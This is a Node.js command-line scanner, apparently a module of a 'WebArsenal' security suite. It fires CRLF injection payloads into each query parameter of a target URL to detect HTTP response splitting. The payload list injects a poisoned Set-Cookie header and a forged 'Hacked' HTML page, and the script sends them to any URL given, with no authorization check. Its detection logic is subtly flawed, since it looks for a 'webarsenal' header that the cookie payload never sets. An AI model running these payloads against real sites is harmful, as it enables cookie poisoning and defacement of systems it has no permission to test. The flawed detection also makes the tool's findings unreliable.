#!/usr/bin/env node
/**
 * ╔════════════════════════════════════════════════════════════════════════════╗
 * ║ WebArsenal v5.5.0 "Pulse" - Advanced Security Suite                          ║
 * ║ De{c0}ded by Edwin Dev                                                      ║
 * ║ Module: response-splitting-tester.js                                                          ║
 * ╚════════════════════════════════════════════════════════════════════════════╝
 */



/**
 * ╔═════════════════════════════════════════════════════════════════╗
 * ║  WebArsenal: response-splitting-tester.js                        ║
 * ║  Category: analyzers                                            ║
 * ╚═════════════════════════════════════════════════════════════════╝
 */

'use strict';

const { program } = require('commander');
const chalk = require('chalk');
const axios = require('axios');

program
  .name('response-splitting-tester.js')
  .description('Tests for HTTP Response Splitting by injecting CRLF characters into parameters.')
  .version('3.0.0')
  .requiredOption('-u, --url <url>', 'Target URL with parameters')
  .parse(process.argv);

const opts = program.opts();

const CRLF_PAYLOADS = [
  "%0d%0aSet-Cookie: webarsenal=poison",
  "\r\nContent-Type: text/html\r\n\r\n<html><body>Hacked</body></html>",
  "%E5%98%8D%E5%98%8AContent-Type:text/html%E5%98%8D%E5%98%8A"
];

async function run() {
  console.log(chalk.bold.magenta('\n╔════════════════════════════════════════════╗'));
  console.log(chalk.bold.magenta(  '║  WebArsenal Module: ' + 'response-splitting-tester.js'.padEnd(23) + '║'));
  console.log(chalk.bold.magenta(  '╚════════════════════════════════════════════╝\n'));
  
  const targetUrl = new URL(opts.url);
  const params = Array.from(targetUrl.searchParams.keys());
  
  if (params.length === 0) {
    console.log(chalk.yellow('[!] No parameters found. Use -u <url?q=test>'));
    return;
  }
  
  for (const param of params) {
    console.log(chalk.cyan(`[*] Fuzzing for Response Splitting: ${param}`));
    for (const payload of CRLF_PAYLOADS) {
      const testUrl = new URL(targetUrl.href);
      testUrl.searchParams.set(param, payload);
      
      try {
        const res = await axios.get(testUrl.href, { timeout: 5000, validateStatus: () => true });
        
        // Detection logic: Check if injected header was set
        if (res.headers['webarsenal'] === 'poison' || String(res.data).includes('Hacked')) {
           console.log(chalk.bold.red(`\n[!] VULNERABILITY DETECTED! [${param}]`));
           console.log(chalk.red(`    Payload: ${payload}`));
           console.log(chalk.red(`    URL: ${testUrl.href}\n`));
           break;
        }
      } catch (e) {}
    }
  }
  
  console.log(chalk.cyan('\n[*] Tests complete.'));
}

if (require.main === module) { run().catch(console.error); }
module.exports = { run };
